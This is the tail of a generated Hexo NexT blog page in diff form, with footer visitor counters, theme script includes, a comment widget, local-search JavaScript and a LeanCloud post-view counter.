+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-blind" aria-hidden="true"></i>本站访客数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      人
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-user-md" aria-hidden="true"></i>本站总访问量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length == 0) {
+      search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.popup').toggle();
+    }
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+      $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = $( "entry", xmlResponse ).map(function() {
+            return {
+              title: $( "title", this ).text(),
+              content: $("content",this).text(),
+              url: $( "url" , this).text()
+            };
+          }).get();
+          var $input = document.getElementById(search_id);
+          var $resultContent = document.getElementById(content_id);
+          $input.addEventListener('input', function(){
+            var matchcounts = 0;
+            var str='<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length > 1) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var content_index = [];
+                var data_title = data.title.trim().toLowerCase();
+                var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
+                var data_url = decodeURIComponent(data.url);
+                var index_title = -1;
+                var index_content = -1;
+                var first_occur = -1;
+                // only match artiles with not empty titles and contents
+                if(data_title != '') {
+                  keywords.forEach(function(keyword, i) {
+                    index_title = data_title.indexOf(keyword);
+                    index_content = data_content.indexOf(keyword);
+                    if( index_title >= 0 || index_content >= 0 ){
+                      isMatch = true;
+                      if (i == 0) {
+                        first_occur = index_content;
+                      }
+                    }
+
+                  });
+                }
+                // show search results
+                if (isMatch) {
+                  matchcounts += 1;
+                  str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
+                  var content = data.content.trim().replace(/<[^>]+>/g,"");
+                  if (first_occur >= 0) {
+                    // cut out 100 characters
+                    var start = first_occur - 20;
+                    var end = first_occur + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if(start == 0){
+                      end = 50;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    var match_content = content.substring(start, end);
+                    // highlight all keywords
+                    keywords.forEach(function(keyword){
+                      var regS = new RegExp(keyword, "gi");
+                      match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
+                    });
+
+                    str += "<p class=\"search-result\">" + match_content +"...</p>"
+                  }
+                  str += "</li>";
+                }
+              })};
+            str += "</ul>";
+            if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
+            if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
+            $resultContent.innerHTML = str;
+          });
+          proceedsearch();
+        }
+      });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched == false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(function(e){
+      $('.popup').hide();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    });
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+  <script>AV.initialize("KVNdpVifyFqJPx0bzSg6cN7z-gzGzoHsz", "vlNRwqLbdUTKC1W06gjYj0iG");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
